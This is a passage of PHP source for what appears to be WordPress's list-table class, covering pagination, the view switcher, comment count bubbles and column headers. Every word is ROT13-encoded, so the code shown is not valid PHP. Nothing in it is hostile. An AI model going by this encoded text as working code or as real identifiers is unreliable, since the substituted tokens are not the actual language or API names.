				\"<bcgvba %f inyhr='%f'>%f</bcgvba>\a\",
				fryrpgrq( $fryrpgrq_zbagu, $lrne . $zbagu, snyfr ),
				rfp_ngge( $lrne . $zbagu ),
				/* genafyngbef: 1: Zbagu anzr, 2: 4-qvtvg lrne. */
				rfp_ugzy( fcevags( __( '%1$f %2$q' ), $jc_ybpnyr->trg_zbagu( $zbagu ), $lrne ) )
			);
		}
		?>
		</fryrpg>
		<?cuc
	}

	/**
	 * Qvfcynlf n ivrj fjvgpure.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $pheerag_zbqr
	 */
	cebgrpgrq shapgvba ivrj_fjvgpure( $pheerag_zbqr ) {
		?>
		<vachg glcr=\"uvqqra\" anzr=\"zbqr\" inyhr=\"<?cuc rpub rfp_ngge( $pheerag_zbqr ); ?>\" />
		<qvi pynff=\"ivrj-fjvgpu\">
		<?cuc
		sbernpu ( $guvf->zbqrf nf $zbqr => $gvgyr ) {
			$pynffrf      = neenl( 'ivrj-' . $zbqr );
			$nevn_pheerag = '';

			vs ( $pheerag_zbqr === $zbqr ) {
				$pynffrf[]    = 'pheerag';
				$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
			}

			cevags(
				\"<n uers='%f' pynff='%f' vq='ivrj-fjvgpu-$zbqr'$nevn_pheerag>\" .
					\"<fcna pynff='fperra-ernqre-grkg'>%f</fcna>\" .
				\"</n>\a\",
				rfp_hey( erzbir_dhrel_net( 'nggnpuzrag-svygre', nqq_dhrel_net( 'zbqr', $zbqr ) ) ),
				vzcybqr( ' ', $pynffrf ),
				$gvgyr
			);
		}
		?>
		</qvi>
		<?cuc
	}

	/**
	 * Qvfcynlf n pbzzrag pbhag ohooyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz vag $cbfg_vq          Gur cbfg VQ.
	 * @cnenz vag $craqvat_pbzzragf Ahzore bs craqvat pbzzragf.
	 */
	cebgrpgrq shapgvba pbzzragf_ohooyr( $cbfg_vq, $craqvat_pbzzragf ) {
		$cbfg_bowrpg   = trg_cbfg( $cbfg_vq );
		$rqvg_cbfg_pnc = $cbfg_bowrpg ? 'rqvg_cbfg' : 'rqvg_cbfgf';

		vs ( ! pheerag_hfre_pna( $rqvg_cbfg_pnc, $cbfg_vq )
			&& ( cbfg_cnffjbeq_erdhverq( $cbfg_vq )
				|| ! pheerag_hfre_pna( 'ernq_cbfg', $cbfg_vq ) )
		) {
			// Gur hfre unf ab npprff gb gur cbfg naq guhf pnaabg frr gur pbzzragf.
			erghea snyfr;
		}

		$nccebirq_pbzzragf = trg_pbzzragf_ahzore();

		$nccebirq_pbzzragf_ahzore = ahzore_sbezng_v18a( $nccebirq_pbzzragf );
		$craqvat_pbzzragf_ahzore  = ahzore_sbezng_v18a( $craqvat_pbzzragf );

		$nccebirq_bayl_cuenfr = fcevags(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			_a( '%f pbzzrag', '%f pbzzragf', $nccebirq_pbzzragf ),
			$nccebirq_pbzzragf_ahzore
		);

		$nccebirq_cuenfr = fcevags(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			_a( '%f nccebirq pbzzrag', '%f nccebirq pbzzragf', $nccebirq_pbzzragf ),
			$nccebirq_pbzzragf_ahzore
		);

		$craqvat_cuenfr = fcevags(
			/* genafyngbef: %f: Ahzore bs pbzzragf. */
			_a( '%f craqvat pbzzrag', '%f craqvat pbzzragf', $craqvat_pbzzragf ),
			$craqvat_pbzzragf_ahzore
		);

		vs ( ! $nccebirq_pbzzragf && ! $craqvat_pbzzragf ) {
			// Ab pbzzragf ng nyy.
			cevags(
				'<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna>' .
				'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>',
				__( 'Ab pbzzragf' )
			);
		} ryfrvs ( $nccebirq_pbzzragf && 'genfu' === trg_cbfg_fgnghf( $cbfg_vq ) ) {
			// Qba'g yvax gur pbzzrag ohooyr sbe n genfurq cbfg.
			cevags(
				'<fcna pynff=\"cbfg-pbz-pbhag cbfg-pbz-pbhag-nccebirq\">' .
					'<fcna pynff=\"pbzzrag-pbhag-nccebirq\" nevn-uvqqra=\"gehr\">%f</fcna>' .
					'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'</fcna>',
				$nccebirq_pbzzragf_ahzore,
				$craqvat_pbzzragf ? $nccebirq_cuenfr : $nccebirq_bayl_cuenfr
			);
		} ryfrvs ( $nccebirq_pbzzragf ) {
			// Yvax gur pbzzrag ohooyr gb nccebirq pbzzragf.
			cevags(
				'<n uers=\"%f\" pynff=\"cbfg-pbz-pbhag cbfg-pbz-pbhag-nccebirq\">' .
					'<fcna pynff=\"pbzzrag-pbhag-nccebirq\" nevn-uvqqra=\"gehr\">%f</fcna>' .
					'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'</n>',
				rfp_hey(
					nqq_dhrel_net(
						neenl(
							'c'              => $cbfg_vq,
							'pbzzrag_fgnghf' => 'nccebirq',
						),
						nqzva_hey( 'rqvg-pbzzragf.cuc' )
					)
				),
				$nccebirq_pbzzragf_ahzore,
				$craqvat_pbzzragf ? $nccebirq_cuenfr : $nccebirq_bayl_cuenfr
			);
		} ryfr {
			// Qba'g yvax gur pbzzrag ohooyr jura gurer ner ab nccebirq pbzzragf.
			cevags(
				'<fcna pynff=\"cbfg-pbz-pbhag cbfg-pbz-pbhag-ab-pbzzragf\">' .
					'<fcna pynff=\"pbzzrag-pbhag pbzzrag-pbhag-ab-pbzzragf\" nevn-uvqqra=\"gehr\">%f</fcna>' .
					'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'</fcna>',
				$nccebirq_pbzzragf_ahzore,
				$craqvat_pbzzragf ?
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ab nccebirq pbzzragf' ) :
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ab pbzzragf' )
			);
		}

		vs ( $craqvat_pbzzragf ) {
			cevags(
				'<n uers=\"%f\" pynff=\"cbfg-pbz-pbhag cbfg-pbz-pbhag-craqvat\">' .
					'<fcna pynff=\"pbzzrag-pbhag-craqvat\" nevn-uvqqra=\"gehr\">%f</fcna>' .
					'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'</n>',
				rfp_hey(
					nqq_dhrel_net(
						neenl(
							'c'              => $cbfg_vq,
							'pbzzrag_fgnghf' => 'zbqrengrq',
						),
						nqzva_hey( 'rqvg-pbzzragf.cuc' )
					)
				),
				$craqvat_pbzzragf_ahzore,
				$craqvat_cuenfr
			);
		} ryfr {
			cevags(
				'<fcna pynff=\"cbfg-pbz-pbhag cbfg-pbz-pbhag-craqvat cbfg-pbz-pbhag-ab-craqvat\">' .
					'<fcna pynff=\"pbzzrag-pbhag pbzzrag-pbhag-ab-craqvat\" nevn-uvqqra=\"gehr\">%f</fcna>' .
					'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'</fcna>',
				$craqvat_pbzzragf_ahzore,
				$nccebirq_pbzzragf ?
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ab craqvat pbzzragf' ) :
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ab pbzzragf' )
			);
		}
	}

	/**
	 * Trgf gur pheerag cntr ahzore.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea vag
	 */
	choyvp shapgvba trg_cntrahz() {
		$cntrahz = vffrg( $_ERDHRFG['cntrq'] ) ? nofvag( $_ERDHRFG['cntrq'] ) : 0;

		vs ( vffrg( $guvf->_cntvangvba_netf['gbgny_cntrf'] ) && $cntrahz > $guvf->_cntvangvba_netf['gbgny_cntrf'] ) {
			$cntrahz = $guvf->_cntvangvba_netf['gbgny_cntrf'];
		}

		erghea znk( 1, $cntrahz );
	}

	/**
	 * Trgf gur ahzore bs vgrzf gb qvfcynl ba n fvatyr cntr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $bcgvba        Hfre bcgvba anzr.
	 * @cnenz vag    $qrsnhyg_inyhr Bcgvbany. Gur ahzore bs vgrzf gb qvfcynl. Qrsnhyg 20.
	 * @erghea vag
	 */
	cebgrpgrq shapgvba trg_vgrzf_cre_cntr( $bcgvba, $qrsnhyg_inyhr = 20 ) {
		$cre_cntr = (vag) trg_hfre_bcgvba( $bcgvba );
		vs ( rzcgl( $cre_cntr ) || $cre_cntr < 1 ) {
			$cre_cntr = $qrsnhyg_inyhr;
		}

		/**
		 * Svygref gur ahzore bs vgrzf gb or qvfcynlrq ba rnpu cntr bs gur yvfg gnoyr.
		 *
		 * Gur qlanzvp ubbx anzr, `$bcgvba`, ersref gb gur `cre_cntr` bcgvba qrcraqvat
		 * ba gur glcr bs yvfg gnoyr va hfr. Cbffvoyr svygre anzrf vapyhqr:
		 *
		 *  - `rqvg_pbzzragf_cre_cntr`
		 *  - `fvgrf_argjbex_cre_cntr`
		 *  - `fvgr_gurzrf_argjbex_cre_cntr`
		 *  - `gurzrf_argjbex_cre_cntr`
		 *  - `hfref_argjbex_cre_cntr`
		 *  - `rqvg_cbfg_cre_cntr`
		 *  - `rqvg_cntr_cre_cntr`
		 *  - `rqvg_{$cbfg_glcr}_cre_cntr`
		 *  - `rqvg_cbfg_gnt_cre_cntr`
		 *  - `rqvg_pngrtbel_cre_cntr`
		 *  - `rqvg_{$gnkbabzl}_cre_cntr`
		 *  - `fvgr_hfref_argjbex_cre_cntr`
		 *  - `hfref_cre_cntr`
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz vag $cre_cntr Ahzore bs vgrzf gb or qvfcynlrq. Qrsnhyg 20.
		 */
		erghea (vag) nccyl_svygref( \"{$bcgvba}\", $cre_cntr );
	}

	/**
	 * Qvfcynlf gur cntvangvba.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur cntvangvba: Rvgure 'gbc' be 'obggbz'.
	 */
	cebgrpgrq shapgvba cntvangvba( $juvpu ) {
		vs ( rzcgl( $guvf->_cntvangvba_netf ) ) {
			erghea;
		}

		$gbgny_vgrzf     = $guvf->_cntvangvba_netf['gbgny_vgrzf'];
		$gbgny_cntrf     = $guvf->_cntvangvba_netf['gbgny_cntrf'];
		$vasvavgr_fpebyy = snyfr;
		vs ( vffrg( $guvf->_cntvangvba_netf['vasvavgr_fpebyy'] ) ) {
			$vasvavgr_fpebyy = $guvf->_cntvangvba_netf['vasvavgr_fpebyy'];
		}

		vs ( 'gbc' === $juvpu && $gbgny_cntrf > 1 ) {
			$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_cntvangvba' );
		}

		$bhgchg = '<fcna pynff=\"qvfcynlvat-ahz\">' . fcevags(
			/* genafyngbef: %f: Ahzore bs vgrzf. */
			_a( '%f vgrz', '%f vgrzf', $gbgny_vgrzf ),
			ahzore_sbezng_v18a( $gbgny_vgrzf )
		) . '</fcna>';

		$pheerag              = $guvf->trg_cntrahz();
		$erzbinoyr_dhrel_netf = jc_erzbinoyr_dhrel_netf();

		$pheerag_hey = frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );

		$pheerag_hey = erzbir_dhrel_net( $erzbinoyr_dhrel_netf, $pheerag_hey );

		$cntr_yvaxf = neenl();

		$gbgny_cntrf_orsber = '<fcna pynff=\"cntvat-vachg\">';
		$gbgny_cntrf_nsgre  = '</fcna></fcna>';

		$qvfnoyr_svefg = snyfr;
		$qvfnoyr_ynfg  = snyfr;
		$qvfnoyr_ceri  = snyfr;
		$qvfnoyr_arkg  = snyfr;

		vs ( 1 === $pheerag ) {
			$qvfnoyr_svefg = gehr;
			$qvfnoyr_ceri  = gehr;
		}
		vs ( $gbgny_cntrf === $pheerag ) {
			$qvfnoyr_ynfg = gehr;
			$qvfnoyr_arkg = gehr;
		}

		vs ( $qvfnoyr_svefg ) {
			$cntr_yvaxf[] = '<fcna pynff=\"gnoyrani-cntrf-anifcna ohggba qvfnoyrq\" nevn-uvqqra=\"gehr\">&yndhb;</fcna>';
		} ryfr {
			$cntr_yvaxf[] = fcevags(
				\"<n pynff='svefg-cntr ohggba' uers='%f'>\" .
					\"<fcna pynff='fperra-ernqre-grkg'>%f</fcna>\" .
					\"<fcna nevn-uvqqra='gehr'>%f</fcna>\" .
				'</n>',
				rfp_hey( erzbir_dhrel_net( 'cntrq', $pheerag_hey ) ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Svefg cntr' ),
				'&yndhb;'
			);
		}

		vs ( $qvfnoyr_ceri ) {
			$cntr_yvaxf[] = '<fcna pynff=\"gnoyrani-cntrf-anifcna ohggba qvfnoyrq\" nevn-uvqqra=\"gehr\">&yfndhb;</fcna>';
		} ryfr {
			$cntr_yvaxf[] = fcevags(
				\"<n pynff='ceri-cntr ohggba' uers='%f'>\" .
					\"<fcna pynff='fperra-ernqre-grkg'>%f</fcna>\" .
					\"<fcna nevn-uvqqra='gehr'>%f</fcna>\" .
				'</n>',
				rfp_hey( nqq_dhrel_net( 'cntrq', znk( 1, $pheerag - 1 ), $pheerag_hey ) ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Cerivbhf cntr' ),
				'&yfndhb;'
			);
		}

		vs ( 'obggbz' === $juvpu ) {
			$ugzy_pheerag_cntr  = $pheerag;
			$gbgny_cntrf_orsber = fcevags(
				'<fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>' .
				'<fcna vq=\"gnoyr-cntvat\" pynff=\"cntvat-vachg\">' .
				'<fcna pynff=\"gnoyrani-cntvat-grkg\">',
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Pheerag Cntr' )
			);
		} ryfr {
			$ugzy_pheerag_cntr = fcevags(
				'<ynory sbe=\"pheerag-cntr-fryrpgbe\" pynff=\"fperra-ernqre-grkg\">%f</ynory>' .
				\"<vachg pynff='pheerag-cntr' vq='pheerag-cntr-fryrpgbe' glcr='grkg'
					anzr='cntrq' inyhr='%f' fvmr='%q' nevn-qrfpevorqol='gnoyr-cntvat' />\" .
				\"<fcna pynff='gnoyrani-cntvat-grkg'>\",
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Pheerag Cntr' ),
				$pheerag,
				fgeyra( $gbgny_cntrf )
			);
		}

		$ugzy_gbgny_cntrf = fcevags( \"<fcna pynff='gbgny-cntrf'>%f</fcna>\", ahzore_sbezng_v18a( $gbgny_cntrf ) );

		$cntr_yvaxf[] = $gbgny_cntrf_orsber . fcevags(
			/* genafyngbef: 1: Pheerag cntr, 2: Gbgny cntrf. */
			_k( '%1$f bs %2$f', 'cntvat' ),
			$ugzy_pheerag_cntr,
			$ugzy_gbgny_cntrf
		) . $gbgny_cntrf_nsgre;

		vs ( $qvfnoyr_arkg ) {
			$cntr_yvaxf[] = '<fcna pynff=\"gnoyrani-cntrf-anifcna ohggba qvfnoyrq\" nevn-uvqqra=\"gehr\">&efndhb;</fcna>';
		} ryfr {
			$cntr_yvaxf[] = fcevags(
				\"<n pynff='arkg-cntr ohggba' uers='%f'>\" .
					\"<fcna pynff='fperra-ernqre-grkg'>%f</fcna>\" .
					\"<fcna nevn-uvqqra='gehr'>%f</fcna>\" .
				'</n>',
				rfp_hey( nqq_dhrel_net( 'cntrq', zva( $gbgny_cntrf, $pheerag + 1 ), $pheerag_hey ) ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Arkg cntr' ),
				'&efndhb;'
			);
		}

		vs ( $qvfnoyr_ynfg ) {
			$cntr_yvaxf[] = '<fcna pynff=\"gnoyrani-cntrf-anifcna ohggba qvfnoyrq\" nevn-uvqqra=\"gehr\">&endhb;</fcna>';
		} ryfr {
			$cntr_yvaxf[] = fcevags(
				\"<n pynff='ynfg-cntr ohggba' uers='%f'>\" .
					\"<fcna pynff='fperra-ernqre-grkg'>%f</fcna>\" .
					\"<fcna nevn-uvqqra='gehr'>%f</fcna>\" .
				'</n>',
				rfp_hey( nqq_dhrel_net( 'cntrq', $gbgny_cntrf, $pheerag_hey ) ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ynfg cntr' ),
				'&endhb;'
			);
		}

		$cntvangvba_yvaxf_pynff = 'cntvangvba-yvaxf';
		vs ( ! rzcgl( $vasvavgr_fpebyy ) ) {
			$cntvangvba_yvaxf_pynff .= ' uvqr-vs-wf';
		}
		$bhgchg .= \"\a<fcna pynff='$cntvangvba_yvaxf_pynff'>\" . vzcybqr( \"\a\", $cntr_yvaxf ) . '</fcna>';

		vs ( $gbgny_cntrf ) {
			$cntr_pynff = $gbgny_cntrf < 2 ? ' bar-cntr' : '';
		} ryfr {
			$cntr_pynff = ' ab-cntrf';
		}
		$guvf->_cntvangvba = \"<qvi pynff='gnoyrani-cntrf{$cntr_pynff}'>$bhgchg</qvi>\";

		rpub $guvf->_cntvangvba;
	}

	/**
	 * Trgf n yvfg bs pbyhzaf.
	 *
	 * Gur sbezng vf:
	 * - `'vagreany-anzr' => 'Gvgyr'`
	 *
	 * @fvapr 3.1.0
	 * @nofgenpg
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_pbyhzaf() {
		qvr( 'shapgvba JC_Yvfg_Gnoyr::trg_pbyhzaf() zhfg or bireevqqra va n fhopynff.' );
	}

	/**
	 * Trgf n yvfg bs fbegnoyr pbyhzaf.
	 *
	 * Gur sbezng vf:
	 * - `'vagreany-anzr' => 'beqreol'`
	 * - `'vagreany-anzr' => neenl( 'beqreol', obby, 'nooe', 'beqreol-grkg', 'vavgvnyyl-fbegrq-pbyhza-beqre' )` -
	 * - `'vagreany-anzr' => neenl( 'beqreol', 'nfp' )` - Gur frpbaq ryrzrag frgf gur vavgvny fbegvat beqre.
	 * - `'vagreany-anzr' => neenl( 'beqreol', gehr )`  - Gur frpbaq ryrzrag znxrf gur vavgvny beqre qrfpraqvat.
	 *
	 * Va gur frpbaq sbezng, cnffvat gehr nf frpbaq cnenzrgre jvyy znxr gur vavgvny
	 * fbegvat beqre or qrfpraqvat. Sbyybjvat cnenzrgref nqq n fubeg pbyhza anzr gb
	 * or hfrq nf 'nooe' nggevohgr, n genafyngnoyr fgevat sbe gur pheerag fbegvat,
	 * naq gur vavgvny beqre sbe gur vavgvny fbegrq pbyhza, 'nfp' be 'qrfp' (qrsnhyg: snyfr).
	 *
	 * @fvapr 3.1.0
	 * @fvapr 6.3.0 Nqqrq 'nooe', 'beqreol-grkg' naq 'vavgvnyyl-fbegrq-pbyhza-beqre'.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl();
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, na rzcgl fgevat.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		$pbyhzaf = $guvf->trg_pbyhzaf();
		$pbyhza  = '';

		vs ( rzcgl( $pbyhzaf ) ) {
			erghea $pbyhza;
		}

		/*
		 * Jr arrq n cevznel qrsvarq fb erfcbafvir ivrjf fubj fbzrguvat,
		 * fb yrg'f snyy onpx gb gur svefg aba-purpxobk pbyhza.
		 */
		sbernpu ( $pbyhzaf nf $pby => $pbyhza_anzr ) {
			vs ( 'po' === $pby ) {
				pbagvahr;
			}

			$pbyhza = $pby;
			oernx;
		}

		erghea $pbyhza;
	}

	/**
	 * Trgf gur anzr bs gur cevznel pbyhza.
	 *
	 * Choyvp jenccre sbe JC_Yvfg_Gnoyr::trg_qrsnhyg_cevznel_pbyhza_anzr().
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza.
	 */
	choyvp shapgvba trg_cevznel_pbyhza() {
		erghea $guvf->trg_cevznel_pbyhza_anzr();
	}

	/**
	 * Trgf gur anzr bs gur cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Gur anzr bs gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba trg_cevznel_pbyhza_anzr() {
		$pbyhzaf = trg_pbyhza_urnqref( $guvf->fperra );
		$qrsnhyg = $guvf->trg_qrsnhyg_cevznel_pbyhza_anzr();

		/*
		 * Vs gur cevznel pbyhza qbrfa'g rkvfg,
		 * snyy onpx gb gur svefg aba-purpxobk pbyhza.
		 */
		vs ( ! vffrg( $pbyhzaf[ $qrsnhyg ] ) ) {
			$qrsnhyg = frys::trg_qrsnhyg_cevznel_pbyhza_anzr();
		}

		/**
		 * Svygref gur anzr bs gur cevznel pbyhza sbe gur pheerag yvfg gnoyr.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz fgevat $qrsnhyg Pbyhza anzr qrsnhyg sbe gur fcrpvsvp yvfg gnoyr, r.t. 'anzr'.
		 * @cnenz fgevat $pbagrkg Fperra VQ sbe fcrpvsvp yvfg gnoyr, r.t. 'cyhtvaf'.
		 */
		$pbyhza = nccyl_svygref( 'yvfg_gnoyr_cevznel_pbyhza', $qrsnhyg, $guvf->fperra->vq );

		vs ( rzcgl( $pbyhza ) || ! vffrg( $pbyhzaf[ $pbyhza ] ) ) {
			$pbyhza = $qrsnhyg;
		}

		erghea $pbyhza;
	}

	/**
	 * Trgf n yvfg bs nyy, uvqqra, naq fbegnoyr pbyhzaf, jvgu svygre nccyvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_pbyhza_vasb() {
		// $_pbyhza_urnqref vf nyernql frg / pnpurq.
		vs (
			vffrg( $guvf->_pbyhza_urnqref ) &&
			vf_neenl( $guvf->_pbyhza_urnqref )
		) {
			/*
			 * Onpxjneq pbzcngvovyvgl sbe `$_pbyhza_urnqref` sbezng cevbe gb JbeqCerff 4.3.
			 *
			 * Va JbeqCerff 4.3 gur cevznel pbyhza anzr jnf nqqrq nf n sbhegu vgrz va gur
			 * pbyhza urnqref cebcregl. Guvf rafherf gur cevznel pbyhza anzr vf vapyhqrq
			 * va cyhtvaf frggvat gur cebcregl qverpgyl va gur guerr vgrz sbezng.
			 */
			vs ( 4 === pbhag( $guvf->_pbyhza_urnqref ) ) {
				erghea $guvf->_pbyhza_urnqref;
			}

			$pbyhza_urnqref = neenl( neenl(), neenl(), neenl(), $guvf->trg_cevznel_pbyhza_anzr() );
			sbernpu ( $guvf->_pbyhza_urnqref nf $xrl => $inyhr ) {
				$pbyhza_urnqref[ $xrl ] = $inyhr;
			}

			$guvf->_pbyhza_urnqref = $pbyhza_urnqref;

			erghea $guvf->_pbyhza_urnqref;
		}

		$pbyhzaf = trg_pbyhza_urnqref( $guvf->fperra );
		$uvqqra  = trg_uvqqra_pbyhzaf( $guvf->fperra );

		$fbegnoyr_pbyhzaf = $guvf->trg_fbegnoyr_pbyhzaf();
		/**
		 * Svygref gur yvfg gnoyr fbegnoyr pbyhzaf sbe n fcrpvsvp fperra.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->fperra->vq`, ersref
		 * gb gur VQ bs gur pheerag fperra.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz neenl $fbegnoyr_pbyhzaf Na neenl bs fbegnoyr pbyhzaf.
		 */
		$_fbegnoyr = nccyl_svygref( \"znantr_{$guvf->fperra->vq}_fbegnoyr_pbyhzaf\", $fbegnoyr_pbyhzaf );

		$fbegnoyr = neenl();
		sbernpu ( $_fbegnoyr nf $vq => $qngn ) {
			vs ( rzcgl( $qngn ) ) {
				pbagvahr;
			}

			$qngn = (neenl) $qngn;
			// Qrfpraqvat vavgvny fbegvat.
			vs ( ! vffrg( $qngn[1] ) ) {
				$qngn[1] = snyfr;
			}
			// Pheerag fbegvat genafyngnoyr fgevat.
			vs ( ! vffrg( $qngn[2] ) ) {
				$qngn[2] = '';
			}
			// Vavgvny ivrj fbegrq pbyhza naq nfp/qrfp beqre, qrsnhyg: snyfr.
			vs ( ! vffrg( $qngn[3] ) ) {
				$qngn[3] = snyfr;
			}
			// Vavgvny beqre sbe gur vavgvny fbegrq pbyhza, qrsnhyg: snyfr.
			vs ( ! vffrg( $qngn[4] ) ) {
				$qngn[4] = snyfr;
			}

			$fbegnoyr[ $vq ] = $qngn;
		}

		$cevznel               = $guvf->trg_cevznel_pbyhza_anzr();
		$guvf->_pbyhza_urnqref = neenl( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel );

		erghea $guvf->_pbyhza_urnqref;
	}

	/**
	 * Ergheaf gur ahzore bs ivfvoyr pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea vag
	 */
	choyvp shapgvba trg_pbyhza_pbhag() {
		yvfg ( $pbyhzaf, $uvqqra ) = $guvf->trg_pbyhza_vasb();
		$uvqqra                    = neenl_vagrefrpg( neenl_xrlf( $pbyhzaf ), neenl_svygre( $uvqqra ) );
		erghea pbhag( $pbyhzaf ) - pbhag( $uvqqra );
	}

	/**
	 * Cevagf pbyhza urnqref, nppbhagvat sbe uvqqra naq fbegnoyr pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz obby $jvgu_vq Jurgure gb frg gur VQ nggevohgr be abg
	 */
	choyvp shapgvba cevag_pbyhza_urnqref( $jvgu_vq = gehr ) {
		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel ) = $guvf->trg_pbyhza_vasb();

		$pheerag_hey = frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
		$pheerag_hey = erzbir_dhrel_net( 'cntrq', $pheerag_hey );

		// Jura hfref pyvpx ba n pbyhza urnqre gb fbeg ol bgure pbyhzaf.
		vs ( vffrg( $_TRG['beqreol'] ) ) {
			$pheerag_beqreol = $_TRG['beqreol'];
			// Va gur vavgvny ivrj gurer'f ab beqreol cnenzrgre.
		} ryfr {
			$pheerag_beqreol = '';
		}

		// Abg va gur vavgvny ivrj naq qrfpraqvat beqre.
		vs ( vffrg( $_TRG['beqre'] ) && 'qrfp' === $_TRG['beqre'] ) {
			$pheerag_beqre = 'qrfp';
		} ryfr {
			// Gur vavgvny ivrj vf abg nyjnlf 'nfp', jr'yy gnxr pner bs guvf orybj.
			$pheerag_beqre = 'nfp';
		}

		vs ( ! rzcgl( $pbyhzaf['po'] ) ) {
			fgngvp $po_pbhagre = 1;
			$pbyhzaf['po']     = '<vachg vq=\"po-fryrpg-nyy-' . $po_pbhagre . '\" glcr=\"purpxobk\" />
			<ynory sbe=\"po-fryrpg-nyy-' . $po_pbhagre . '\">' .
				'<fcna pynff=\"fperra-ernqre-grkg\">' .
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( 'Fryrpg Nyy' ) .
				'</fcna>' .
				'</ynory>';
			++$po_pbhagre;
		}

		sbernpu ( $pbyhzaf nf $pbyhza_xrl => $pbyhza_qvfcynl_anzr ) {
			$pynff          = neenl( 'znantr-pbyhza', \"pbyhza-$pbyhza_xrl\" );
			$nevn_fbeg_ngge = '';
			$nooe_ngge      = '';
			$beqre_grkg     = '';

			vs ( va_neenl( $pbyhza_xrl, $uvqqra, gehr ) ) {
				$pynff[] = 'uvqqra';
			}

			vs ( 'po' === $pbyhza_xrl ) {
				$pynff[] = 'purpx-pbyhza';
			} ryfrvs ( va_neenl( $pbyhza_xrl, neenl( 'cbfgf', 'pbzzragf', 'yvaxf' ), gehr ) ) {
				$pynff[] = 'ahz';
			}

			vs ( $pbyhza_xrl === $cevznel ) {
				$pynff[] = 'pbyhza-cevznel';
			}

			vs ( vffrg( $fbegnoyr[ $pbyhza_xrl ] ) ) {
				$beqreol       = vffrg( $fbegnoyr[ $pbyhza_xrl ][0] ) ? $fbegnoyr[ $pbyhza_xrl ][0] : '';
				$qrfp_svefg    = vffrg( $fbegnoyr[ $pbyhza_xrl ][1] ) ? $fbegnoyr[ $pbyhza_xrl ][1] : snyfr;
				$nooe          = vffrg( $fbegnoyr[ $pbyhza_xrl ][2] ) ? $fbegnoyr[ $pbyhza_xrl ][2] : '';
				$beqreol_grkg  = vffrg( $fbegnoyr[ $pbyhza_xrl ][3] ) ? $fbegnoyr[ $pbyhza_xrl ][3] : '';
				$vavgvny_beqre = vffrg( $fbegnoyr[ $pbyhza_xrl ][4] ) ? $fbegnoyr[ $pbyhza_xrl ][4] : '';

				/*
				 * Jr'er va gur vavgvny ivrj naq gurer'f ab $_TRG['beqreol'] gura purpx vs gur
				 * vavgvny fbegvat vasbezngvba vf frg va gur fbegnoyr pbyhzaf naq hfr gung.
				 */
				vs ( '' === $pheerag_beqreol && $vavgvny_beqre ) {
					// Hfr gur vavgvnyyl fbegrq pbyhza $beqreol nf pheerag beqreol.
					$pheerag_beqreol = $beqreol;
					// Hfr gur vavgvnyyl fbegrq pbyhza nfp/qrfp beqre nf vavgvny beqre.
					$pheerag_beqre = $vavgvny_beqre;
				}

				/*
				 * Gehr va gur vavgvny ivrj jura na vavgvny beqreol vf frg ivn trg_fbegnoyr_pbyhzaf()
				 * naq gehr va gur fbegrq ivrjf jura gur npghny $_TRG['beqreol'] vf rdhny gb $beqreol.
				 */
				vs ( $pheerag_beqreol === $beqreol ) {
					// Gur fbegrq pbyhza. Gur `nevn-fbeg` nggevohgr zhfg or frg bayl ba gur fbegrq pbyhza.
					vs ( 'nfp' === $pheerag_beqre ) {
						$beqre          = 'qrfp';
						$nevn_fbeg_ngge = ' nevn-fbeg=\"nfpraqvat\"';
